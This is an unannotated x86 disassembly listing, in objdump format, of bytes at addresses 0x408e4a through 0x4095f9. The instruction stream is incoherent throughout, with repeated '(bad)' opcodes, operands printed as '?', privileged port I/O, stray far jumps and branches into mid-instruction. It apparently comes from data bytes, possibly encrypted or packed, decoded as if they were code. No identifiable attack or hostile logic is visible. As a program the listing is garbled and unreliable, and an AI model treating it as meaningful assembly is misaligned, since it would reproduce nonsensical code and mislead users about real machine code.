  408e4a:	int3   
  408e4b:	add    ebp,esp
  408e4d:	xchg   esi,eax
  408e4e:	and    eax,0x64faa841
  408e53:	iret   
  408e54:	lock push eax
  408e56:	lds    ebx,FWORD PTR [edx]
  408e58:	jb     0x408ded
  408e5a:	mov    dh,0x57
  408e5c:	cwde   
  408e5d:	lahf   
  408e5e:	cmp    cl,ah
  408e60:	xor    eax,0x35a33b05
  408e65:	fs mov ebx,0x47ed1d08
  408e6b:	mov    al,ds:0xac3156dc
  408e70:	mov    ebx,0x1b21916
  408e75:	out    dx,al
  408e76:	jns    0x408eba
  408e78:	mov    DWORD PTR [edx],eax
  408e7a:	and    eax,0xbb1c19bf
  408e7f:	fdiv   QWORD PTR ds:[eax]
  408e82:	jne    0x408e60
  408e84:	and    eax,0x9fd04caf
  408e89:	aas    
  408e8a:	test   BYTE PTR [edi+0x1cccfe7e],bh
  408e90:	test   eax,0x64a8f63b
  408e95:	fsub   QWORD PTR [ebp+0x42f4a511]
  408e9b:	jmp    DWORD PTR [edi]
  408e9d:	es (bad) 
  408e9f:	stos   DWORD PTR es:[edi],eax
  408ea0:	push   ds
  408ea1:	inc    esi
  408ea2:	fdivr  st(2),st
  408ea4:	stos   BYTE PTR es:[edi],al
  408ea5:	in     eax,0x7b
  408ea7:	jmp    0x70f6:0xc3dd3e0d
  408eae:	adc    eax,0x132b6811
  408eb3:	sbb    eax,0xb25ef36c
  408eb8:	mul    BYTE PTR [edx+0x117d77ee]
  408ebe:	lock push edi
  408ec0:	repnz dec eax
  408ec2:	mov    edi,fs
  408ec4:	test   eax,0xda2b23e2
  408ec9:	xor    al,0xae
  408ecb:	mov    ?,WORD PTR [ecx+0x5d]
  408ece:	and    al,0x80
  408ed0:	mov    esi,0xafa372d6
  408ed5:	cmp    eax,ecx
  408ed7:	sub    BYTE PTR [ecx-0x6a],0x36
  408edb:	xchg   edx,eax
  408edc:	push   cs
  408edd:	xchg   ecx,eax
  408ede:	test   ah,al
  408ee0:	aas    
  408ee1:	pop    ss
  408ee2:	xor    al,BYTE PTR [edi+0x7]
  408ee5:	pop    ebx
  408ee6:	inc    edi
  408ee7:	shl    edi,cl
  408ee9:	fdivrp st(4),st
  408eeb:	int    0xfb
  408eed:	jo     0x408e72
  408eef:	in     al,0xd
  408ef1:	popa   
  408ef2:	mov    cl,0xfc
  408ef4:	sub    eax,0x85e1931c
  408ef9:	pop    ebx
  408efa:	popa   
  408efb:	mov    dh,BYTE PTR [esi]
  408efd:	icebp  
  408efe:	jge    0x408ee0
  408f00:	pop    edx
  408f01:	imul   BYTE PTR [edi-0x4b]
  408f04:	lahf   
  408f05:	mov    dl,0x6c
  408f07:	and    DWORD PTR [ebx],eax
  408f09:	jg     0x408eb3
  408f0b:	xchg   esi,eax
  408f0c:	cmp    edx,edx
  408f0e:	push   ebx
  408f0f:	mov    al,0x46
  408f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f12:	pop    ds
  408f13:	dec    edi
  408f14:	shr    DWORD PTR [ebx-0x5d],1
  408f17:	mov    bh,0xa6
  408f19:	xor    DWORD PTR [esi],ecx
  408f1b:	or     dl,bl
  408f1d:	cwde   
  408f1e:	aad    0x97
  408f20:	inc    esp
  408f21:	push   ds
  408f22:	add    eax,0x953db948
  408f27:	retf   
  408f28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f29:	push   edx
  408f2a:	icebp  
  408f2b:	push   ds
  408f2c:	lods   eax,DWORD PTR ds:[esi]
  408f2d:	push   ecx
  408f2e:	mov    ds:0x1ba06490,al
  408f33:	call   edi
  408f35:	fisubr DWORD PTR [edx-0x40]
  408f38:	xchg   esi,eax
  408f39:	sub    BYTE PTR [ecx],0x6d
  408f3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f3d:	shl    DWORD PTR ds:0x2d703124,1
  408f43:	adc    esp,ebp
  408f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f46:	je     0x408f53
  408f48:	jae    0x408f61
  408f4a:	push   cs
  408f4b:	(bad)  [ebp+0x4d351499]
  408f51:	adc    eax,0xb13a60b9
  408f56:	test   DWORD PTR [ecx+0x6c],edi
  408f59:	sbb    BYTE PTR [ecx+0x4e],al
  408f5c:	retf   0x6c7
  408f5f:	jnp    0x408fd4
  408f61:	push   esp
  408f62:	rcl    DWORD PTR [esi],0xb4
  408f65:	mov    cs,ebx
  408f67:	add    DWORD PTR gs:[ebx+edx*2+0x65795507],ebp
  408f6f:	mov    bl,BYTE PTR [eax+0x2360f810]
  408f75:	(bad)  
  408f76:	in     al,0xfc
  408f78:	pop    ebp
  408f79:	push   esi
  408f7a:	add    BYTE PTR [ebp+eax*8-0x54],ah
  408f7e:	cs ins DWORD PTR es:[edi],dx
  408f80:	jb     0x408f34
  408f82:	jge    0x408f20
  408f84:	mov    eax,0x7b4ac735
  408f89:	call   0x37261b21
  408f8e:	jmp    0xdee:0x6b99b88
  408f95:	push   esi
  408f96:	push   ecx
  408f97:	mov    WORD PTR [eax+0xfb62bc9],ds
  408f9d:	fxtract 
  408f9f:	mov    eax,0xacd5d60
  408fa4:	mov    DWORD PTR [ecx],ebp
  408fa6:	imul   eax,DWORD PTR [ebx],0x633ed9eb
  408fac:	sbb    eax,0x7ddc82a0
  408fb1:	and    al,0x14
  408fb3:	jp     0x409020
  408fb5:	mov    gs,WORD PTR [ebp+0x51ad37ce]
  408fbb:	pop    ss
  408fbc:	inc    ebx
  408fbd:	icebp  
  408fbe:	cmp    al,0xdc
  408fc0:	mov    al,0x45
  408fc2:	pop    ecx
  408fc3:	cmp    eax,0xe731d4e2
  408fc8:	sub    BYTE PTR [ebx+0xa],dl
  408fcb:	xor    cl,dl
  408fcd:	repnz fadd st,st(1)
  408fd0:	adc    esi,DWORD PTR [ebx]
  408fd2:	fldcw  WORD PTR [ecx+0x13]
  408fd5:	jo     0x408fee
  408fd7:	sub    BYTE PTR [ecx],dl
  408fd9:	dec    BYTE PTR ds:[ecx+ebp*8+0x535101a0]
  408fe1:	int    0x6d
  408fe3:	mov    cl,BYTE PTR [edx]
  408fe5:	mov    ecx,DWORD PTR [esi+0x48]
  408fe8:	mov    eax,ds:0x6f01a5ea
  408fee:	sti    
  408fef:	fwait
  408ff0:	add    al,0x86
  408ff2:	mov    dl,0x59
  408ff4:	shl    edx,cl
  408ff6:	jle    0x408f82
  408ff8:	in     eax,0xc5
  408ffa:	inc    eax
  408ffb:	sub    eax,0x235b8d06
  409000:	sub    eax,0xfd61c0c
  409005:	xor    ebx,DWORD PTR [eax]
  409007:	aas    
  409008:	pusha  
  409009:	adc    DWORD PTR [ebx-0x7676de95],ebp
  40900f:	lock retf 0x8c22
  409013:	inc    edi
  409014:	fnstcw WORD PTR [edi+0x54]
  409017:	dec    eax
  409018:	jge    0x40905b
  40901a:	xor    eax,0x9204783e
  40901f:	adc    DWORD PTR [ebp+0x3b],esi
  409022:	imul   edi,DWORD PTR [edi+0x58],0x56
  409026:	add    BYTE PTR [edi+0x32],bl
  409029:	xchg   ecx,eax
  40902a:	adc    al,0x9d
  40902c:	push   eax
  40902d:	push   ss
  40902e:	inc    ebx
  40902f:	div    DWORD PTR [ebx+0x5698fbe8]
  409035:	les    edx,FWORD PTR es:[ecx]
  409038:	and    bh,BYTE PTR [edi-0xb390d8a]
  40903e:	jmp    0x40900b
  409040:	pop    ecx
  409041:	icebp  
  409042:	jb     0x409012
  409044:	inc    edi
  409045:	sahf   
  409046:	inc    esi
  409047:	or     ch,ch
  409049:	test   DWORD PTR [edx],edi
  40904b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40904c:	in     eax,0xdd
  40904e:	sahf   
  40904f:	mov    dh,0xbe
  409051:	ds cmc 
  409053:	aam    0xf
  409055:	pop    fs
  409057:	sbb    eax,0x203ea738
  40905c:	xchg   edi,eax
  40905d:	sbb    edi,DWORD PTR [ecx+0x21]
  409060:	adc    esp,ecx
  409062:	cdq    
  409063:	mov    eax,ds:0xd63a97d
  409068:	sub    ah,BYTE PTR [ecx+0x15]
  40906b:	mov    bl,0x75
  40906d:	cmp    eax,0xd718deed
  409072:	dec    ecx
  409073:	clc    
  409074:	mov    ds:0x40479570,eax
  409079:	(bad)  
  40907a:	xlat   BYTE PTR ds:[ebx]
  40907b:	iret   
  40907c:	sbb    al,0x8f
  40907e:	dec    esi
  40907f:	inc    esp
  409080:	inc    esi
  409081:	push   ds
  409082:	loope  0x40907a
  409084:	jecxz  0x409034
  409086:	sbb    al,ch
  409088:	hlt    
  409089:	push   ebx
  40908a:	sub    al,0xdd
  40908c:	push   esp
  40908d:	sbb    dh,BYTE PTR [esi-0x6c]
  409090:	repnz les ebp,FWORD PTR [eax+0x4166355d]
  409097:	int    0xaf
  409099:	mov    ds:0xcb763ad6,al
  40909e:	pop    esi
  40909f:	push   0xf6f092ce
  4090a4:	inc    esi
  4090a5:	int3   
  4090a6:	xchg   bl,bl
  4090a8:	pop    es
  4090a9:	jbe    0x40905b
  4090ab:	or     DWORD PTR [ebp-0x5a108563],ebx
  4090b1:	inc    ebx
  4090b2:	adc    eax,0xa45e9740
  4090b7:	pushf  
  4090b8:	ret    
  4090b9:	loope  0x40910b
  4090bb:	dec    esi
  4090bc:	xchg   esi,eax
  4090bd:	dec    esi
  4090be:	lds    ecx,FWORD PTR [esi-0x14]
  4090c1:	arpl   sp,cx
  4090c3:	inc    ebp
  4090c4:	jae    0x409138
  4090c6:	mov    ds:0xccfff33,al
  4090cb:	mov    WORD PTR [esi+0xf],ds
  4090ce:	sbb    DWORD PTR [edx+0x4bd73bee],edi
  4090d4:	shl    DWORD PTR [esi+0x7fe3b503],0x8c
  4090db:	jo     0x4090ba
  4090dd:	mov    WORD PTR [edx+0x72789cae],?
  4090e3:	xor    ah,BYTE PTR [ebx]
  4090e5:	mov    edx,0x8de63f6c
  4090ea:	scas   eax,DWORD PTR es:[edi]
  4090eb:	xlat   BYTE PTR ds:[ebx]
  4090ec:	mov    eax,0xb9f62808
  4090f1:	jge    0x409164
  4090f3:	xor    DWORD PTR [edi],0x5c
  4090f6:	pop    esi
  4090f7:	arpl   WORD PTR [ebx+0x272c82b0],bp
  4090fd:	scas   eax,DWORD PTR es:[edi]
  4090fe:	jne    0x40911b
  409100:	cli    
  409101:	ret    0xac8d
  409104:	or     DWORD PTR [ebx+0x7f],edi
  409107:	sub    eax,0x69702098
  40910c:	sub    bh,0x7f
  40910f:	in     al,0x22
  409111:	jo     0x4090d9
  409113:	inc    ebx
  409114:	xor    ah,BYTE PTR [edi+ebx*2+0x1c4e0764]
  40911b:	mov    ds:0x6e04553c,eax
  409120:	push   edi
  409121:	mov    ds:0x6f1f6f8,al
  409126:	jno    0x409103
  409128:	adc    BYTE PTR [edx+0x2d],cl
  40912b:	pop    ds
  40912c:	adc    DWORD PTR [edi+0x6],edi
  40912f:	test   al,0x4e
  409131:	xchg   ebp,eax
  409132:	stos   DWORD PTR es:[edi],eax
  409133:	loope  0x40919c
  409135:	jmp    0xf32:0xb0bd01ce
  40913c:	xchg   DWORD PTR [ecx+ebp*4],ecx
  40913f:	into   
  409140:	loop   0x40914a
  409142:	loope  0x4091ac
  409144:	dec    ebx
  409145:	or     BYTE PTR [ebp+0x41188f93],cl
  40914b:	cmc    
  40914c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40914d:	xchg   ebx,eax
  40914e:	and    BYTE PTR [edi-0x1cc7e9a6],bh
  409154:	sub    eax,0x951ae2ca
  409159:	add    BYTE PTR [ebx],ch
  40915b:	dec    esi
  40915c:	inc    esp
  40915d:	xlat   BYTE PTR ds:[ebx]
  40915e:	jecxz  0x4090f4
  409160:	jo     0x4090eb
  409162:	(bad)  
  409164:	mov    ax,0x8fb7
  409168:	adc    DWORD PTR [ecx+0x6223d99d],0x8d0725a1
  409172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409173:	fiadd  WORD PTR [edx+0x42]
  409176:	(bad)  
  409178:	pop    ds
  409179:	push   ss
  40917a:	jmp    0x77700cb4
  40917f:	pop    esp
  409180:	cmp    cl,dl
  409182:	scas   al,BYTE PTR es:[edi]
  409183:	lahf   
  409184:	imul   edx,DWORD PTR [ebx+0x31],0xfffffff0
  409188:	xlat   BYTE PTR ds:[ebx]
  409189:	fld    DWORD PTR [eax+0x54]
  40918c:	sti    
  40918d:	dec    ebp
  40918e:	sub    eax,0xcf7a151a
  409193:	or     BYTE PTR [edi+ebx*2],dh
  409196:	jmp    0x4091e2
  409198:	pop    es
  409199:	mov    ds:0x29b5b36b,eax
  40919e:	adc    BYTE PTR [edx],ch
  4091a0:	add    ebx,DWORD PTR [edi]
  4091a2:	mov    BYTE PTR [eax],bh
  4091a4:	dec    ecx
  4091a5:	popa   
  4091a6:	cmp    esp,DWORD PTR [ecx]
  4091a8:	aas    
  4091a9:	sub    eax,0x57e1e3eb
  4091ae:	pop    ss
  4091af:	dec    esp
  4091b0:	das    
  4091b1:	ins    DWORD PTR es:[edi],dx
  4091b2:	fisttp QWORD PTR [ecx]
  4091b4:	(bad)  
  4091b5:	cld    
  4091b6:	ja     0x409217
  4091b8:	ja     0x4091c1
  4091ba:	or     eax,DWORD PTR [edx+0x62]
  4091bd:	lea    eax,[ecx]
  4091bf:	inc    ebx
  4091c0:	lods   al,BYTE PTR ds:[esi]
  4091c1:	jno    0x409170
  4091c3:	jns    0x409210
  4091c5:	mov    dh,0xa9
  4091c7:	pushf  
  4091c8:	hlt    
  4091c9:	or     BYTE PTR [esi],al
  4091cb:	jb     0x409177
  4091cd:	into   
  4091ce:	nop
  4091cf:	mov    DWORD PTR [esi],0xa596e233
  4091d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091d6:	test   DWORD PTR [ecx],0x7b246f6e
  4091dc:	xor    DWORD PTR [ecx-0x1f35d96a],ebx
  4091e2:	repz fidiv WORD PTR [ebp-0x320d6c64]
  4091e9:	mov    ds:0x98bd0088,eax
  4091ee:	jns    0x4091b5
  4091f0:	inc    ecx
  4091f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091f2:	sbb    eax,0xb9534ce2
  4091f7:	out    0xb5,al
  4091f9:	mov    ds:0x95bb134d,eax
  4091fe:	aas    
  4091ff:	adc    BYTE PTR [edx],al
  409201:	add    ch,dh
  409203:	inc    edi
  409204:	ds mov bh,0xb5
  409207:	or     al,0x90
  409209:	or     al,0xf3
  40920b:	mov    ah,0xe8
  40920d:	inc    ecx
  40920e:	and    al,0x88
  409210:	and    DWORD PTR [esi],0xffffff86
  409213:	mov    ds:0xc3d6e50d,eax
  409218:	pop    edx
  409219:	xor    BYTE PTR [eax+edx*1-0x59],0x1d
  40921e:	pop    esi
  40921f:	fcom   QWORD PTR [eax+0x3]
  409222:	repz fisub WORD PTR [edi]
  409225:	inc    ebp
  409226:	in     eax,dx
  409227:	in     eax,0xf8
  409229:	aam    0x9d
  40922b:	test   eax,0x601374fc
  409230:	dec    edi
  409231:	les    ecx,FWORD PTR [ebp-0x279ca329]
  409237:	out    0x5,al
  409239:	pop    ds
  40923a:	ror    ecx,1
  40923c:	mov    dl,0xd8
  40923e:	repz cmp al,0x9d
  409241:	stos   DWORD PTR es:[edi],eax
  409242:	and    bl,al
  409244:	xchg   esp,eax
  409245:	pop    es
  409246:	test   DWORD PTR [edx],ebp
  409248:	mov    ch,BYTE PTR [ebx+edx*4-0x4a]
  40924c:	popf   
  40924d:	int3   
  40924e:	or     DWORD PTR [ecx],edx
  409250:	dec    ebp
  409251:	into   
  409252:	jae    0x4092ae
  409254:	push   ebp
  409255:	jne    0x4092b4
  409257:	pop    es
  409258:	lds    ecx,FWORD PTR [ecx+0x6e6e3799]
  40925e:	scas   al,BYTE PTR es:[edi]
  40925f:	dec    ebx
  409260:	mov    bh,0xbd
  409262:	sub    eax,0x961180f8
  409267:	pushf  
  409268:	cld    
  409269:	ins    DWORD PTR es:[edi],dx
  40926a:	loop   0x40928a
  40926c:	xchg   ecx,eax
  40926d:	sub    BYTE PTR [ecx-0x3a],0x7c
  409271:	stos   DWORD PTR es:[edi],eax
  409272:	cmc    
  409273:	ret    
  409274:	arpl   WORD PTR [edi],bp
  409276:	imul   ecx,DWORD PTR [ebp+0x3bfacf6],0x37
  40927d:	les    esi,FWORD PTR [esi-0x7a]
  409280:	mov    ds:0x42379f6c,al
  409285:	add    al,0x8d
  409287:	adc    eax,0x5112a293
  40928c:	pop    edx
  40928d:	clc    
  40928e:	dec    esi
  40928f:	pusha  
  409290:	dec    ecx
  409291:	lods   eax,DWORD PTR ds:[esi]
  409292:	jl     0x409279
  409294:	or     eax,0xab9196e7
  409299:	add    eax,ebp
  40929b:	and    al,0xa1
  40929d:	in     eax,0x1e
  40929f:	and    BYTE PTR [esi],dl
  4092a1:	xchg   DWORD PTR [esi],ecx
  4092a3:	mov    al,0x63
  4092a5:	mov    ah,0xdc
  4092a7:	shr    DWORD PTR [edx+0x70f2fc07],cl
  4092ad:	fist   DWORD PTR [edi]
  4092af:	jg     0x40926f
  4092b1:	push   ss
  4092b2:	sub    BYTE PTR [edi+0x30],ch
  4092b5:	push   edx
  4092b6:	inc    ecx
  4092b7:	sbb    ecx,DWORD PTR [ecx]
  4092b9:	add    al,0xe
  4092bb:	or     al,0xf9
  4092bd:	in     al,0xf7
  4092bf:	mov    WORD PTR [edx],fs
  4092c1:	xchg   edx,edx
  4092c3:	repnz fisttp DWORD PTR [esi+0x437a13]
  4092ca:	xchg   edi,eax
  4092cb:	fwait
  4092cc:	rol    DWORD PTR [ecx+0x16e5e947],0xa1
  4092d3:	(bad)  
  4092d4:	inc    DWORD PTR [ebx-0x6f]
  4092d7:	mov    dh,0xb7
  4092d9:	mov    ebp,0x13e3f879
  4092de:	add    eax,DWORD PTR [edx+0x58]
  4092e1:	push   eax
  4092e2:	dec    edx
  4092e3:	pop    ecx
  4092e4:	inc    ecx
  4092e5:	loop   0x409291
  4092e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092e8:	hlt    
  4092e9:	mov    ebx,0x6d2b683d
  4092ee:	mov    ds:0xbf53ff8e,al
  4092f3:	sub    BYTE PTR [bx+0x20ac],dh
  4092f8:	pop    DWORD PTR [edx-0x76cba08c]
  4092fe:	sub    dl,0x8d
  409301:	mov    bh,0xe8
  409303:	add    al,0x49
  409305:	jmp    FWORD PTR [esi-0x565b70c]
  40930b:	ret    0x630e
  40930e:	(bad)  
  40930f:	test   al,0xf5
  409311:	scas   al,BYTE PTR es:[edi]
  409312:	icebp  
  409313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409314:	sub    ch,ch
  409316:	enter  0x5170,0xad
  40931a:	ret    
  40931b:	xor    cl,BYTE PTR [ebx]
  40931d:	xor    eax,0x1ce10064
  409322:	iret   
  409323:	call   0xae53:0x9332126f
  40932a:	loop   0x409395
  40932c:	mov    al,0x71
  40932e:	sub    dh,BYTE PTR [edi+0x390c10d6]
  409334:	or     DWORD PTR [edi+0x63],ecx
  409337:	out    dx,al
  409338:	mov    ?,WORD PTR [ebx]
  40933a:	push   esp
  40933b:	(bad)
  40933f:	jns    0x4093b3
  409341:	ins    BYTE PTR es:[edi],dx
  409342:	dec    ebp
  409343:	enter  0xfb1d,0xe
  409347:	add    esp,DWORD PTR [esi+0x392c36de]
  40934d:	ins    DWORD PTR es:[edi],dx
  40934e:	ds loopne 0x4093a4
  409351:	adc    DWORD PTR [ebp+0x5d],ebp
  409354:	retf   
  409355:	xlat   BYTE PTR ds:[ebx]
  409356:	rcr    DWORD PTR [esi+0x76],0xc0
  40935a:	xchg   edx,eax
  40935b:	adc    ebp,DWORD PTR [eax]
  40935d:	outs   dx,DWORD PTR ds:[esi]
  40935e:	call   0xe42c:0x8aa55e5c
  409365:	or     DWORD PTR [edx-0x7b3295f3],ecx
  40936b:	jp     0x409351
  40936d:	cld    
  40936e:	int    0x47
  409370:	mov    ebx,0x52b7454
  409375:	rcl    ah,cl
  409377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409378:	arpl   WORD PTR [esi],si
  40937a:	(bad)  
  40937b:	cs ins BYTE PTR es:[edi],dx
  40937d:	dec    ecx
  40937e:	jl     0x4093e5
  409380:	test   BYTE PTR [ecx],ch
  409382:	mov    ecx,0x4908725f
  409387:	stos   DWORD PTR es:[edi],eax
  409388:	mov    ds:0x2cfccd6d,al
  40938d:	mov    ah,0xc4
  40938f:	dec    ebx
  409391:	xchg   ebx,eax
  409392:	push   edi
  409393:	or     edx,0xffffffcc
  409396:	sti    
  409397:	mov    eax,0xc7bc0171
  40939c:	stos   DWORD PTR es:[edi],eax
  40939d:	in     eax,0xc6
  40939f:	mov    ds:0xd63b24f3,eax
  4093a4:	or     BYTE PTR [esi-0x24e7d95f],ch
  4093aa:	fwait
  4093ab:	cli    
  4093ac:	xor    DWORD PTR [edi+0x37],eax
  4093af:	add    esi,DWORD PTR [edx]
  4093b1:	cmc    
  4093b2:	mov    cl,0x5a
  4093b4:	mov    ds:0x2fdc2dfe,al
  4093b9:	add    DWORD PTR [ebp+0x44e43eb8],ebp
  4093bf:	cmp    ah,BYTE PTR [esi-0x2b406b26]
  4093c5:	jne    0x4093ff
  4093c7:	ret    
  4093c8:	iret   
  4093c9:	adc    DWORD PTR [esp+0x5a2d2a60],edi
  4093d0:	pop    eax
  4093d1:	aas    
  4093d2:	mov    al,0x22
  4093d4:	push   eax
  4093d5:	out    dx,al
  4093d6:	fs jp  0x4093e3
  4093d9:	mov    edi,0xfb656a88
  4093de:	(bad)  
  4093df:	sbb    DWORD PTR [edx-0x25f83691],edx
  4093e5:	fdivp  st(7),st
  4093e7:	sbb    esi,esp
  4093e9:	std    
  4093ea:	mov    WORD PTR [edi-0x69],gs
  4093ed:	and    al,BYTE PTR [edi+0x2ce70dd6]
  4093f3:	ss sahf 
  4093f5:	jnp    0x40940f
  4093f7:	cmp    DWORD PTR [edx+edi*4-0x516be495],ebp
  4093fe:	das    
  4093ff:	loopne 0x409409
  409401:	or     ebx,ebx
  409403:	cmc    
  409404:	outs   dx,BYTE PTR ds:[esi]
  409405:	es ret 0x8bef
  409409:	cmp    DWORD PTR [eax],esp
  40940b:	cmp    BYTE PTR [eax+esi*1+0x6a6bb508],0xc0
  409413:	pop    es
  409414:	hlt    
  409415:	fistp  DWORD PTR [edi+esi*4+0x22]
  409419:	mov    ecx,0xa7fee6ef
  40941e:	mov    ds:0x83b3becf,eax
  409423:	aas    
  409424:	int3   
  409425:	inc    eax
  409426:	sbb    edx,ebx
  409428:	(bad)  
  40942a:	or     edi,ebp
  40942c:	mov    dl,0x27
  40942e:	push   eax
  40942f:	cmp    eax,DWORD PTR [esi+0x2f]
  409432:	and    ebp,esp
  409434:	inc    ecx
  409435:	clc    
  409436:	stos   BYTE PTR es:[edi],al
  409437:	pop    es
  409438:	js     0x4093bd
  40943a:	or     DWORD PTR [ecx+0x3e],ebx
  40943d:	das    
  40943e:	mov    bh,al
  409440:	test   DWORD PTR [ebx-0x3a],edx
  409443:	mov    ah,0xfd
  409445:	add    al,0xa
  409447:	pop    edx
  409448:	sub    BYTE PTR [ebx-0x106e985e],bl
  40944e:	lahf   
  40944f:	jmp    0xf9c9a830
  409454:	retf   0x797
  409457:	push   esi
  409458:	sbb    al,0x2
  40945a:	pop    es
  40945b:	shl    DWORD PTR [edi-0x42],0x1
  40945f:	lods   eax,DWORD PTR ds:[esi]
  409460:	ror    DWORD PTR [edi+0xc3afc8e],1
  409466:	aad    0xd7
  409468:	int3   
  409469:	aam    0x61
  40946b:	mov    ebp,0x797a03c2
  409470:	sbb    BYTE PTR [edx],0xae
  409473:	clc    
  409474:	clc    
  409475:	popf   
  409476:	iret   
  409477:	mov    dl,0x2a
  409479:	dec    ebp
  40947a:	jle    0x409449
  40947c:	rol    BYTE PTR [ecx+eiz*2-0x67],1
  409480:	push   edx
  409481:	inc    ecx
  409482:	cmc    
  409483:	pop    ds
  409484:	shr    DWORD PTR [esi],0x84
  409487:	mov    esi,0x52a13ab
  40948c:	mov    ecx,0xb68b46ba
  409491:	ret    0x725d
  409494:	push   ecx
  409495:	add    DWORD PTR [edx],0xd9224f91
  40949b:	add    ebp,DWORD PTR [ecx+0x13eb4bf6]
  4094a1:	xchg   esi,eax
  4094a2:	mov    bh,0x70
  4094a4:	mov    bh,0xd8
  4094a6:	retf   0x24b7
  4094a9:	mov    esi,0x4eb486d6
  4094ae:	bound  edi,QWORD PTR [ecx+edx*4-0x3c]
  4094b2:	dec    eax
  4094b3:	sbb    esp,DWORD PTR [ecx+0x49cc93d8]
  4094b9:	in     al,dx
  4094ba:	scas   eax,DWORD PTR es:[edi]
  4094bb:	xor    al,0xd3
  4094bd:	push   0x554e8ece
  4094c2:	add    al,0x7e
  4094c4:	jno    0x4094e3
  4094c6:	sahf   
  4094c7:	test   BYTE PTR [edx+0x507d67aa],0x92
  4094ce:	mov    esp,0x985cd7e6
  4094d3:	test   al,0xa6
  4094d5:	push   ds
  4094d6:	sti    
  4094d7:	cli    
  4094d8:	js     0x409493
  4094da:	nop
  4094db:	dec    ebp
  4094dc:	stc    
  4094dd:	or     cl,BYTE PTR [ebx]
  4094df:	std    
  4094e0:	pop    esp
  4094e1:	adc    ah,al
  4094e3:	ret    
  4094e4:	sub    BYTE PTR [ebx-0x20],ch
  4094e7:	sub    eax,0x776ead9e
  4094ec:	int    0x36
  4094ee:	jmp    0xc689:0xbedef438
  4094f5:	xlat   BYTE PTR ds:[ebx]
  4094f6:	(bad)  
  4094f8:	or     DWORD PTR cs:[edi],ecx
  4094fb:	push   es
  4094fc:	fdivrp st(3),st
  4094fe:	rol    DWORD PTR [edx-0x5f6db7f7],cl
  409504:	cmp    al,0xfd
  409506:	aas    
  409507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409508:	adc    al,0xb5
  40950a:	mov    al,0xc3
  40950c:	data16 arpl WORD PTR [edi-0x32],dx
  409510:	inc    ecx
  409511:	xlat   BYTE PTR ds:[ebx]
  409512:	add    al,0x42
  409514:	xchg   esi,eax
  409515:	sub    DWORD PTR [edi+0x3],eax
  409518:	mov    bh,0x41
  40951a:	jmp    0xd82495b
  40951f:	jl     0x4094fd
  409521:	fst    QWORD PTR [ecx+0x2d]
  409524:	pop    ecx
  409525:	xlat   BYTE PTR ds:[ebx]
  409526:	test   eax,eax
  409528:	pop    esi
  409529:	jb     0x40959f
  40952b:	jns    0x409594
  40952d:	pop    ecx
  40952e:	inc    esi
  40952f:	dec    esp
  409530:	push   cs
  409531:	icebp  
  409532:	gs jmp 0x4095a3
  409535:	mov    eax,ds:0xcedaf530
  40953a:	sbb    ebp,ebx
  40953c:	push   ebx
  40953d:	dec    esp
  40953e:	or     DWORD PTR ds:[ebx-0x7b],edi
  409542:	and    eax,0x758b4ea
  409547:	ret    
  409548:	ret    0x73b2
  40954b:	mov    ecx,0x76e361bd
  409550:	xor    al,0x5b
  409552:	je     0x409529
  409554:	sub    dh,0x1e
  409557:	sbb    DWORD PTR [ebx-0x5d],eax
  40955a:	or     BYTE PTR [esi-0x21220c7a],dl
  409560:	push   edi
  409561:	xlat   BYTE PTR ds:[ebx]
  409562:	pop    ss
  409563:	cdq    
  409564:	or     DWORD PTR es:[edi+edi*1+0x4e4e9902],eax
  40956c:	add    BYTE PTR [eax],bh
  40956e:	dec    edi
  40956f:	pop    ds
  409570:	out    0xfc,eax
  409572:	cwde   
  409573:	bound  edi,QWORD PTR [esi+ebx*2]
  409576:	ss or  eax,0x686d8939
  40957c:	js     0x4095e5
  40957e:	(bad)  
  40957f:	cld    
  409580:	xchg   ecx,eax
  409581:	ror    BYTE PTR [edx+ebx*4+0x3177611a],1
  409588:	xor    BYTE PTR [ebp+0x19],al
  40958b:	dec    edx
  40958c:	xchg   edx,eax
  40958d:	dec    ebp
  40958e:	ss cld 
  409590:	in     eax,0xaa
  409592:	pop    edi
  409593:	adc    eax,0x6fdebe68
  409598:	xchg   edi,eax
  409599:	pop    ebx
  40959a:	xor    BYTE PTR [ebx+edx*1+0x4974c88f],ch
  4095a1:	add    ebx,0xfebdbf2f
  4095a7:	cld    
  4095a8:	inc    DWORD PTR [esi-0x64dabf5]
  4095ae:	fimul  WORD PTR ds:[ebp+0x6a]
  4095b2:	in     al,dx
  4095b3:	adc    ecx,DWORD PTR [edi-0xa]
  4095b6:	pop    ds
  4095b7:	scas   al,BYTE PTR es:[edi]
  4095b8:	or     DWORD PTR [ebx+0x73052635],0x30
  4095bf:	bound  edx,QWORD PTR gs:[esp+esi*1]
  4095c3:	aad    0x28
  4095c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095c6:	les    edx,FWORD PTR [edx]
  4095c8:	adc    DWORD PTR [eax+edx*8+0x20958841],esp
  4095cf:	xchg   DWORD PTR [eax-0x4f0dba9c],esp
  4095d5:	xor    BYTE PTR [esi-0x54],ch
  4095d8:	inc    edi
  4095d9:	push   ss
  4095da:	inc    eax
  4095db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095dc:	stos   DWORD PTR es:[edi],eax
  4095dd:	outs   dx,DWORD PTR ds:[esi]
  4095de:	xchg   esp,eax
  4095df:	xchg   esp,eax
  4095e0:	inc    edx
  4095e1:	cwde   
  4095e2:	daa    
  4095e3:	in     al,dx
  4095e4:	enter  0xdbb2,0x8f
  4095e8:	into   
  4095e9:	pop    esi
  4095ea:	or     al,0xdb
  4095ec:	xchg   ebp,eax
  4095ed:	test   eax,0xbc6313dc
  4095f2:	mov    edx,0x9cb90541
  4095f7:	out    0xcd,al
  4095f9:	fld    TBYTE PTR [eax+0x526c755a]
